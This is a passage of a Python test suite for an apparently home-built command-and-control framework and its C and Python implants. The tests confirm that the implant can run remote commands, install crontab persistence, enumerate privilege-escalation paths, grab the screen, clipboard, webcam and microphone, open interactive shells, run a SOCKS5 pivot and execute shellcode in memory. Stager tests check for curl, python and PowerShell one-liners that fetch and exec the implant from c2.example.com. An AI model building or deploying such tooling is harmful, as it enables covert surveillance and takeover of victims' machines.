        r = implant_beacon.handle_kill_process({"pid": 9999999, "signal": 0})
        self.assertFalse(r["ok"])
        self.assertIn("error", r)


# ── C implant integration tests ───────────────────────────────────────────────

_HERE = os.path.dirname(os.path.abspath(__file__))
_C_BINARY = os.path.join(_HERE, "implant_beacon_test")


def _build_c_implant():
    """Build the test binary via 'make test_build'. Returns (ok, message)."""
    result = _subprocess.run(
        ["make", "test_build"],
        capture_output=True, text=True, cwd=_HERE, timeout=60
    )
    if result.returncode != 0:
        return False, result.stderr.strip() or result.stdout.strip()
    return True, "built"


def _c_implant_available():
    """Return (available, reason) — True only if binary exists and is executable."""
    if not os.path.isfile(_C_BINARY):
        ok, msg = _build_c_implant()
        if not ok:
            return False, f"build failed: {msg}"
    return True, "ready"


def _queue_c(implant_id, task_type, payload, timeout=15):
    """Queue a task for a specific implant and wait for result."""
    iid = _start_infrastructure()   # ensure C2 is up
    c2_beacon.result_store[implant_id].clear()
    c2_beacon.queue_task(implant_id, task_type, payload)

    def _got():
        return [r for r in c2_beacon.result_store.get(implant_id, [])
                if r.get("type") == task_type] or None

    results = wait_for(_got, timeout=timeout)
    c2_beacon.result_store[implant_id].clear()
    return results[0] if results else None


class TestCImplant(unittest.TestCase):
    """Integration tests for the compiled C implant.

    Skipped automatically if:
      - libcurl4-openssl-dev / libssl-dev are not installed (build fails)
      - The test binary cannot be built for any other reason
    """

    _c_proc   = None   # class-level so tearDownClass can kill it
    _c_iid    = None   # implant ID registered by the C implant

    @classmethod
    def setUpClass(cls):
        available, reason = _c_implant_available()
        if not available:
            raise unittest.SkipTest(
                f"C implant not available — {reason}\n"
                "Install deps: sudo apt install libcurl4-openssl-dev libssl-dev"
            )

        # Ensure the Python C2 test infrastructure is up
        _start_infrastructure()

        # Snapshot all implant IDs already known (Python implant + any stale SQLite entries)
        _existing_ids = set(c2_beacon.implants.keys())

        # Launch C implant subprocess (it points to localhost:9446 via test_build)
        cls._c_proc = _subprocess.Popen(
            [_C_BINARY],
            stdout=_subprocess.DEVNULL,
            stderr=_subprocess.DEVNULL,
            cwd=_HERE,
        )

        # Wait for a genuinely new implant ID (not stale from SQLite / previous runs)
        def _new_implant():
            new = [i for i in c2_beacon.implants if i not in _existing_ids]
            return new[0] if new else None

        cls._c_iid = wait_for(_new_implant, timeout=10)
        if not cls._c_iid:
            cls._c_proc.kill()
            raise unittest.SkipTest(
                "C implant process started but did not register within 10 s"
            )
        print(f"\n  C implant registered: {cls._c_iid[:8]} "
              f"({c2_beacon.implants[cls._c_iid].get('user')}@"
              f"{c2_beacon.implants[cls._c_iid].get('hostname')})")

    @classmethod
    def tearDownClass(cls):
        if cls._c_proc and cls._c_proc.poll() is None:
            cls._c_proc.terminate()
            try:
                cls._c_proc.wait(timeout=3)
            except _subprocess.TimeoutExpired:
                cls._c_proc.kill()
        # Remove test binary
        if os.path.isfile(_C_BINARY):
            os.unlink(_C_BINARY)

    # ── helpers ────────────────────────────────────────────────────────────────

    def _q(self, task_type, payload=None):
        """Queue a task for the C implant and return the result."""
        return _queue_c(self._c_iid, task_type, payload or {})

    # ── tests ──────────────────────────────────────────────────────────────────

    def test_c_execute(self):
        r = self._q("execute", {"command": "echo c_implant_ok"})
        self.assertIsNotNone(r, "no result from C implant execute")
        self.assertTrue(r["ok"], f"execute failed: {r}")
        self.assertIn("c_implant_ok", r["output"])

    def test_c_execute_nonexistent(self):
        r = self._q("execute", {"command": "nonexistent_cmd_xyz_12345"})
        self.assertIsNotNone(r)
        self.assertTrue(r["ok"])   # C implant returns ok=true; output contains error

    def test_c_sysinfo(self):
        r = self._q("sysinfo")
        self.assertIsNotNone(r, "no result from C implant sysinfo")
        self.assertTrue(r["ok"], f"sysinfo failed: {r}")
        out = r["output"]
        for field in ("Hostname:", "OS:", "User:", "PID:"):
            self.assertIn(field, out, f"sysinfo missing field: {field}")

    def test_c_ls(self):
        r = self._q("ls", {"path": "."})
        self.assertIsNotNone(r, "no result from C implant ls")
        self.assertTrue(r["ok"], f"ls failed: {r}")
        self.assertEqual(r.get("format"), "ls")
        entries = r.get("entries", [])
        self.assertIsInstance(entries, list)
        self.assertGreater(len(entries), 0)
        names = [e["name"] for e in entries]
        self.assertIn("c2_beacon.py", names)

    def test_c_ls_nonexistent(self):
        r = self._q("ls", {"path": "/nonexistent_xyzzy_999"})
        self.assertIsNotNone(r)
        self.assertFalse(r["ok"])

    def test_c_ps(self):
        r = self._q("ps")
        self.assertIsNotNone(r, "no result from C implant ps")
        self.assertTrue(r["ok"], f"ps failed: {r}")
        self.assertEqual(r.get("format"), "ps", "C implant ps missing format field")
        entries = r.get("entries", [])
        self.assertIsInstance(entries, list)
        self.assertGreater(len(entries), 0, "expected at least 1 process")
        first = entries[0]
        for field in ("user", "pid", "cmd"):
            self.assertIn(field, first, f"ps entry missing field: {field}")
        self.assertIsInstance(first["pid"], int)

    def test_c_netstat(self):
        r = self._q("netstat")
        self.assertIsNotNone(r, "no result from C implant netstat")
        self.assertTrue(r["ok"], f"netstat failed: {r}")
        self.assertIn("output", r)

    def test_c_upload_and_download(self):
        data    = b"c_implant_transfer_test_\xde\xad\xbe\xef"
        encoded = base64.b64encode(data).decode()
        with tempfile.NamedTemporaryFile(delete=False, suffix=".bin") as f:
            path = f.name
        try:
            r_up = self._q("upload", {"filename": path, "file": encoded})
            self.assertIsNotNone(r_up, "no result from C implant upload")
            self.assertTrue(r_up["ok"], f"upload failed: {r_up}")

            r_down = self._q("download", {"filepath": path})
            self.assertIsNotNone(r_down, "no result from C implant download")
            self.assertTrue(r_down["ok"], f"download failed: {r_down}")
            self.assertEqual(base64.b64decode(r_down["data"]), data)
        finally:
            if os.path.exists(path):
                os.unlink(path)

    def test_c_set_interval(self):
        r = self._q("set_interval", {"interval": 1})
        self.assertIsNotNone(r)
        self.assertTrue(r["ok"], f"set_interval failed: {r}")

    def test_c_implant_status_in_api(self):
        """The C implant should appear in /api/implants with correct fields."""
        c2_beacon.operator_app.config["TESTING"] = True
        client = c2_beacon.operator_app.test_client()
        resp   = client.get("/api/implants")
        self.assertEqual(resp.status_code, 200)
        listing = resp.get_json()
        our = next((i for i in listing if i["id"] == self._c_iid), None)
        self.assertIsNotNone(our, "C implant not in /api/implants")
        self.assertIn(our["status"], ("online", "idle"))
        self.assertIn("hostname", our)
        self.assertIn("user",     our)
        self.assertIn("os",       our)

    def test_c_screenshot(self):
        """Screenshot — accept ok (PNG) or ok=False with error message."""
        r = self._q("screenshot")
        self.assertIsNotNone(r, "no result from C implant screenshot")
        if r["ok"]:
            self.assertEqual(r.get("format"), "png")
            raw = base64.b64decode(r["data"])
            self.assertEqual(raw[:8], b"\x89PNG\r\n\x1a\n", "not a valid PNG")
            print(f"  C screenshot: {len(raw):,} bytes PNG")
        else:
            self.assertIn("error", r)
            print(f"  C screenshot unavailable: {r['error']}")

    def test_c_clipboard(self):
        """Clipboard — accept ok with content or ok=False with clear error."""
        r = self._q("clipboard")
        self.assertIsNotNone(r, "no result from C implant clipboard")
        if r["ok"]:
            self.assertIn("output", r)
            print(f"  C clipboard: {len(r['output'])} chars")
        else:
            self.assertIn("error", r)
            print(f"  C clipboard unavailable: {r['error']}")

    def test_c_privesc_enum(self):
        """privesc_enum sections must all be present."""
        r = self._q("privesc_enum")
        self.assertIsNotNone(r, "no result from C implant privesc_enum")
        self.assertTrue(r["ok"], f"privesc_enum failed: {r}")
        out = r["output"]
        for section in ("[ID]", "[SUDO]", "[SUID]", "[ENVIRONMENT]"):
            self.assertIn(section, out, f"privesc_enum missing section: {section}")
        print(f"  C privesc_enum: {len(out)} chars")

    def test_c_kill_process(self):
        """Sending SIGCONT (18) to the test runner PID should succeed."""
        r = self._q("kill_process", {"pid": os.getpid(), "signal": 18})
        self.assertIsNotNone(r, "no result from C implant kill_process")
        self.assertTrue(r["ok"], f"kill_process failed: {r}")
        self.assertIn(str(os.getpid()), r["output"])

    def test_c_kill_process_no_pid(self):
        """kill_process with no pid should return an error."""
        r = self._q("kill_process", {})
        self.assertIsNotNone(r, "no result from C implant kill_process")
        self.assertFalse(r["ok"])
        self.assertIn("error", r)

    def test_c_persist_and_unpersist(self):
        """Persist via crontab, verify entry, unpersist, verify removed."""
        import subprocess as _sp

        r_install = self._q("persist", {"method": "crontab"})
        self.assertIsNotNone(r_install, "no result from C implant persist")
        self.assertTrue(r_install["ok"], f"persist failed: {r_install}")

        cron = _sp.run(["crontab", "-l"], capture_output=True, text=True)
        self.assertIn("implant_beacon_test", cron.stdout,
                      "crontab entry not found after C implant persist")

        # Second call: already persisted
        r2 = self._q("persist", {"method": "crontab"})
        self.assertIsNotNone(r2)
        self.assertTrue(r2["ok"])
        self.assertIn("Already", r2["output"])

        r_remove = self._q("unpersist", {})
        self.assertIsNotNone(r_remove, "no result from C implant unpersist")
        self.assertTrue(r_remove["ok"], f"unpersist failed: {r_remove}")
        out = r_remove["output"]
        self.assertIn("crontab", out)

        cron2 = _sp.run(["crontab", "-l"], capture_output=True, text=True)
        remaining = cron2.stdout if cron2.returncode == 0 else ""
        self.assertNotIn("implant_beacon_test", remaining,
                         "crontab entry still present after unpersist")

    def test_c_webcam_snap(self):
        """webcam_snap — must return ok=True with valid JPEG bytes."""
        r = _queue_c(self._c_iid, "webcam_snap", {"device": "/dev/video0"}, timeout=30)
        self.assertIsNotNone(r, "no result from C implant webcam_snap")
        self.assertTrue(r.get("ok"), f"webcam_snap failed: {r.get('error','')}")
        self.assertEqual(r.get("format"), "jpeg")
        raw = base64.b64decode(r["data"])
        # JPEG magic bytes: FF D8 FF
        self.assertEqual(raw[:2], b"\xff\xd8", f"not a valid JPEG (got {raw[:4].hex()})")
        print(f"  C webcam_snap: {len(raw):,} bytes JPEG")

    def test_c_mic_record(self):
        """mic_record — 1s recording must return ok=True with valid WAV bytes."""
        r = _queue_c(self._c_iid, "mic_record", {"duration": 1, "device": "default"}, timeout=30)
        self.assertIsNotNone(r, "no result from C implant mic_record")
        self.assertTrue(r.get("ok"), f"mic_record failed: {r.get('error','')}")
        self.assertEqual(r.get("format"), "wav")
        self.assertEqual(r.get("duration"), 1)
        raw = base64.b64decode(r["data"])
        # WAV magic: RIFF....WAVE
        self.assertEqual(raw[:4], b"RIFF", f"not a valid WAV (got {raw[:4].hex()})")
        self.assertEqual(raw[8:12], b"WAVE", "WAV header missing WAVE")
        print(f"  C mic_record: {len(raw):,} bytes WAV ({r['duration']}s)")

    def test_z_self_destruct(self):
        """self_destruct should return ok and then terminate the C implant.
        NOTE: Prefixed test_z_ so it sorts LAST within TestCImplant — it kills the process."""
        r = self._q("self_destruct")
        self.assertIsNotNone(r, "no result from C implant self_destruct")
        self.assertTrue(r["ok"], f"self_destruct failed: {r}")
        self.assertIn("Self-destruct", r["output"])

        # Wait for the process to exit (it calls exit(0) after posting result)
        proc = self.__class__._c_proc
        if proc and proc.poll() is None:
            try:
                proc.wait(timeout=8)
            except _subprocess.TimeoutExpired:
                proc.kill()
        self.assertIsNotNone(proc.poll(), "C implant still running after self_destruct")
        # Mark as terminated so tearDownClass skips the kill
        self.__class__._c_proc = None


# ── Interactive shell tests ────────────────────────────────────────────────────

class TestInteractiveShell(unittest.TestCase):
    """Verify shell_open / shell_send / shell_close on Linux (skipped on Windows)."""

    def setUp(self):
        import platform
        if platform.system() == "Windows":
            self.skipTest("pty not supported on Windows")

    def test_shell_open_send_close(self):
        # Open a persistent bash shell
        r_open = _queue("shell_open", {})
        self.assertIsNotNone(r_open, "no result from shell_open")
        self.assertTrue(r_open["ok"], f"shell_open failed: {r_open}")
        sid = r_open.get("session_id")
        self.assertIsNotNone(sid, "shell_open missing session_id")

        # Drain bash startup output (prompt, motd, etc.) so the marker test is clean
        _queue("shell_send", {"session_id": sid, "input": "", "timeout": 1.0})

        # Send a command and verify output across potentially multiple beacon cycles
        _queue("shell_send", {"session_id": sid, "input": "echo shelltest_marker"})
        # Read with generous timeout to capture the echoed output
        r_send = _queue("shell_send", {"session_id": sid, "input": "", "timeout": 2.0})
        self.assertIsNotNone(r_send, "no result from shell_send read")
        self.assertTrue(r_send["ok"], f"shell_send failed: {r_send}")
        # The output should contain our marker (may also contain the prompt)
        self.assertIn("shelltest_marker", r_send["output"],
                      f"marker not in output: {repr(r_send['output'])}")

        # Close the session
        r_close = _queue("shell_close", {"session_id": sid})
        self.assertIsNotNone(r_close, "no result from shell_close")
        self.assertTrue(r_close["ok"], f"shell_close failed: {r_close}")

    def test_shell_send_unknown_session(self):
        r = implant_beacon.handle_shell_send({"session_id": "nonexistent-uuid"})
        self.assertFalse(r["ok"])
        self.assertIn("error", r)

    def test_shell_close_unknown_session(self):
        r = implant_beacon.handle_shell_close({"session_id": "nonexistent-uuid"})
        self.assertFalse(r["ok"])
        self.assertIn("error", r)

    def test_shell_stateful_cwd_change(self):
        """CWD should persist between shell_send calls in the same session."""
        r_open = _queue("shell_open", {})
        self.assertTrue(r_open["ok"])
        sid = r_open["session_id"]
        try:
            # Drain startup noise, then change directory
            _queue("shell_send", {"session_id": sid, "input": "", "timeout": 1.0})
            _queue("shell_send", {"session_id": sid, "input": "cd /tmp"})
            # Print PWD in a way that produces unambiguous output
            _queue("shell_send", {"session_id": sid, "input": "echo PWD=$PWD"})
            r = _queue("shell_send", {"session_id": sid, "input": "", "timeout": 2.0})
            self.assertIsNotNone(r)
            self.assertTrue(r["ok"])
            self.assertIn("/tmp", r["output"])
        finally:
            _queue("shell_close", {"session_id": sid})


# ── SOCKS5 proxy tests ─────────────────────────────────────────────────────────

class TestSocksProxy(unittest.TestCase):
    """Verify socks_start / socks_stop and basic SOCKS5 connectivity."""

    def setUp(self):
        import platform
        if platform.system() == "Windows":
            self.skipTest("SOCKS5 proxy not supported on Windows")
        # Ensure any leftover proxy from a prior test is stopped
        implant_beacon.handle_socks_stop({})

    def tearDown(self):
        implant_beacon.handle_socks_stop({})

    def test_socks_start_stop(self):
        r = _queue("socks_start", {"host": "127.0.0.1", "port": 0})
        self.assertIsNotNone(r, "no result from socks_start")
        self.assertTrue(r["ok"], f"socks_start failed: {r}")
        self.assertIn("port", r)
        port = r["port"]
        self.assertGreater(port, 0)
        print(f"  SOCKS5 listening on 127.0.0.1:{port}")

        r2 = _queue("socks_stop", {})
        self.assertIsNotNone(r2, "no result from socks_stop")
        self.assertTrue(r2["ok"], f"socks_stop failed: {r2}")

    def test_socks_already_running(self):
        _queue("socks_start", {"host": "127.0.0.1", "port": 0})
        r = _queue("socks_start", {})
        self.assertTrue(r["ok"])
        self.assertIn("already", r["output"].lower())

    def test_socks_stop_when_not_running(self):
        r = implant_beacon.handle_socks_stop({})
        self.assertFalse(r["ok"])
        self.assertIn("error", r)

    def test_socks_can_connect_to_localhost(self):
        """Start SOCKS5, connect through it to the C2 port — proves connectivity."""
        import socket as _socket, struct as _struct
        r = _queue("socks_start", {"host": "127.0.0.1", "port": 0})
        self.assertTrue(r["ok"])
        proxy_port = r["port"]
        # Attempt a SOCKS5 CONNECT to 127.0.0.1:9446 (our test C2 port)
        try:
            s = _socket.create_connection(("127.0.0.1", proxy_port), timeout=5)
            s.sendall(b"\x05\x01\x00")                              # greeting
            self.assertEqual(s.recv(2), b"\x05\x00")                # no-auth
            s.sendall(b"\x05\x01\x00\x01" +
                      _socket.inet_aton("127.0.0.1") +
                      _struct.pack("!H", 9446))                     # CONNECT
            resp = s.recv(10)
            self.assertEqual(resp[1], 0, "SOCKS5 CONNECT rejected")
            s.close()
        except Exception as e:
            self.skipTest(f"SOCKS5 connectivity test skipped: {e}")


# ── AES-GCM encrypted tasking tests ───────────────────────────────────────────

class TestEncryptedTasking(unittest.TestCase):
    """Verify AES-GCM encryption round-trip: C2 encrypts tasks, implant decrypts,
    implant encrypts results, C2 decrypts."""

    def setUp(self):
        # Reset to known state
        c2_beacon.ENCRYPT_TASKS = False

    def tearDown(self):
        c2_beacon.ENCRYPT_TASKS = False

    def test_enc_dec_round_trip_direct(self):
        """_enc / _dec round trip at module level."""
        if not c2_beacon._HAVE_CRYPTO:
            self.skipTest("cryptography not installed")
        original = {"task_id": 42, "type": "execute", "command": "echo encrypted_ok"}
        envelope = c2_beacon._enc.__wrapped__(original) if hasattr(c2_beacon._enc, "__wrapped__") else None
        # Test via implant side
        wrapped   = implant_beacon._enc(original)
        recovered = implant_beacon._dec(wrapped)
        self.assertEqual(recovered, original)

    def test_encrypt_tasks_flag(self):
        """When ENCRYPT_TASKS=True, queued task arrives encrypted at implant."""
        if not c2_beacon._HAVE_CRYPTO:
            self.skipTest("cryptography not installed")
        c2_beacon.ENCRYPT_TASKS = True
        r = _queue("execute", {"command": "echo enc_task_ok"})
        self.assertIsNotNone(r, "no result when encryption enabled")
        self.assertTrue(r["ok"], f"execute with encryption failed: {r}")
        self.assertIn("enc_task_ok", r["output"])

    def test_unencrypted_passthrough(self):
        """Without encryption enabled, tasks and results flow plaintext."""
        c2_beacon.ENCRYPT_TASKS = False
        r = _queue("execute", {"command": "echo plain_ok"})
        self.assertIsNotNone(r)
        self.assertTrue(r["ok"])
        self.assertIn("plain_ok", r["output"])

    def test_config_endpoint(self):
        """GET /api/config returns encryption state."""
        c2_beacon.operator_app.config["TESTING"] = True
        client = c2_beacon.operator_app.test_client()
        resp = client.get("/api/config")
        self.assertEqual(resp.status_code, 200)
        cfg = resp.get_json()
        self.assertIn("encrypt_tasks", cfg)
        self.assertIn("crypto_available", cfg)

    def test_encrypt_toggle_endpoint(self):
        """POST /api/config/encrypt toggles ENCRYPT_TASKS."""
        if not c2_beacon._HAVE_CRYPTO:
            self.skipTest("cryptography not installed")
        client = c2_beacon.operator_app.test_client()
        resp = client.post("/api/config/encrypt",
                           json={"enabled": True},
                           content_type="application/json")
        self.assertEqual(resp.status_code, 200)
        self.assertTrue(resp.get_json()["encrypt_tasks"])
        # Disable
        resp = client.post("/api/config/encrypt",
                           json={"enabled": False},
                           content_type="application/json")
        self.assertFalse(resp.get_json()["encrypt_tasks"])


# ── Payload staging tests ──────────────────────────────────────────────────────

class TestPayloadStaging(unittest.TestCase):
    """Verify stager endpoints return usable scripts that reference the C2 URL."""

    def _client(self):
        c2_beacon.operator_app.config["TESTING"] = True
        return c2_beacon.operator_app.test_client()

    def test_stage_implant_serves_script(self):
        resp = self._client().get("/api/stage/implant")
        self.assertEqual(resp.status_code, 200)
        body = resp.data.decode()
        self.assertIn("beacon_loop", body, "implant script missing beacon_loop")

    def test_stage_python_one_liner(self):
        resp = self._client().get("/api/stage/python",
                                   headers={"Host": "c2.example.com:9444"})
        self.assertEqual(resp.status_code, 200)
        stager = resp.data.decode()
        self.assertIn("python3", stager)
        self.assertIn("exec(", stager)
        self.assertIn("c2.example.com", stager)

    def test_stage_sh_one_liner(self):
        resp = self._client().get("/api/stage/sh",
                                   headers={"Host": "c2.example.com:9444"})
        self.assertEqual(resp.status_code, 200)
        stager = resp.data.decode()
        self.assertIn("curl", stager)
        self.assertIn("python3", stager)

    def test_stage_ps1_one_liner(self):
        resp = self._client().get("/api/stage/ps1",
                                   headers={"Host": "c2.example.com:9444"})
        self.assertEqual(resp.status_code, 200)
        stager = resp.data.decode()
        self.assertIn("WebClient", stager)


# ── Multi-operator auth tests ──────────────────────────────────────────────────

class TestMultiOperatorAuth(unittest.TestCase):
    """Verify API key gating on the operator interface."""

    def setUp(self):
        c2_beacon.OPERATOR_API_KEYS = []   # disable auth by default

    def tearDown(self):
        c2_beacon.OPERATOR_API_KEYS = []

    def _client(self):
        c2_beacon.operator_app.config["TESTING"] = True
        return c2_beacon.operator_app.test_client()

    def test_no_auth_when_empty_keys(self):
        """Without any keys configured, all requests pass through."""
        resp = self._client().get("/api/implants")
        self.assertEqual(resp.status_code, 200)

    def test_rejects_without_key(self):
        c2_beacon.OPERATOR_API_KEYS = ["secret-key-abc"]
        resp = self._client().get("/api/implants")
        self.assertEqual(resp.status_code, 401)

    def test_accepts_valid_x_api_key_header(self):
        c2_beacon.OPERATOR_API_KEYS = ["secret-key-abc"]
        resp = self._client().get("/api/implants",
                                   headers={"X-API-Key": "secret-key-abc"})
        self.assertEqual(resp.status_code, 200)

    def test_accepts_bearer_auth_header(self):
        c2_beacon.OPERATOR_API_KEYS = ["my-token"]
        resp = self._client().get("/api/implants",
                                   headers={"Authorization": "Bearer my-token"})
        self.assertEqual(resp.status_code, 200)

    def test_rejects_wrong_key(self):
        c2_beacon.OPERATOR_API_KEYS = ["correct-key"]
        resp = self._client().get("/api/implants",
                                   headers={"X-API-Key": "wrong-key"})
        self.assertEqual(resp.status_code, 401)

    def test_stager_endpoints_bypass_auth(self):
        """Stager endpoints are intentionally public (the attacker fetches them)."""
        c2_beacon.OPERATOR_API_KEYS = ["secret-key-abc"]
        resp = self._client().get("/api/stage/implant")
        self.assertEqual(resp.status_code, 200)

    def test_multiple_valid_keys(self):
        c2_beacon.OPERATOR_API_KEYS = ["key-alpha", "key-beta"]
        client = self._client()
        self.assertEqual(client.get("/api/implants",
                                     headers={"X-API-Key": "key-alpha"}).status_code, 200)
        self.assertEqual(client.get("/api/implants",
                                     headers={"X-API-Key": "key-beta"}).status_code, 200)
        self.assertEqual(client.get("/api/implants",
                                     headers={"X-API-Key": "key-gamma"}).status_code, 401)


# ── In-memory shellcode execution tests ───────────────────────────────────────

class TestExecShellcode(unittest.TestCase):
    """Verify exec_shellcode handler: nop sled + ret on x86_64 Linux."""

    def setUp(self):
        import platform
        if platform.system() != "Linux":
            self.skipTest("exec_shellcode only supported on Linux")

    def test_nop_sled_ret(self):
        """Execute a harmless nop sled + ret (0xC3) shellcode."""
        # x86_64: 8 NOPs then RET
        sc = base64.b64encode(b"\x90" * 8 + b"\xc3").decode()
        r = implant_beacon.handle_exec_shellcode({"shellcode": sc})
        self.assertTrue(r["ok"], f"exec_shellcode failed: {r}")
        self.assertIn("executed", r["output"])

    def test_no_shellcode_field(self):
        r = implant_beacon.handle_exec_shellcode({})
        self.assertFalse(r["ok"])
        self.assertIn("error", r)

    def test_invalid_base64(self):
        r = implant_beacon.handle_exec_shellcode({"shellcode": "not-valid-b64!!!"})
        self.assertFalse(r["ok"])


# ── Entry point ────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    loader  = unittest.TestLoader()
    suite   = unittest.TestSuite()

    # Ordered so infrastructure is set up by TestRegistration first.
    # TestCImplant is last — it launches a real subprocess and is skipped
    # automatically when libcurl4-openssl-dev is not installed.
    for cls in [
        TestRegistration,
        TestCoreCommands,
        TestScreenshot,
        TestKeylogger,
        TestClipboard,
        TestPersistence,
        TestPrivescEnum,
        TestExecPython,
        TestSelfUpdateUnit,
        TestSelfDestructUnit,
        TestC2Backend,
        TestNewTaskTypes,
        TestNewC2Endpoints,
        TestAuditEndpoints,
        TestResultsEndpoint,
        TestQueueTaskAPI,
        TestPatchImplantEdgeCases,
        TestHandlerEdgeCases,
        TestInteractiveShell,
        TestSocksProxy,
        TestEncryptedTasking,
        TestPayloadStaging,
        TestMultiOperatorAuth,
        TestExecShellcode,
        TestCImplant,
    ]:
        suite.addTests(loader.loadTestsFromTestCase(cls))

    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(suite)
    sys.exit(0 if result.wasSuccessful() else 1)
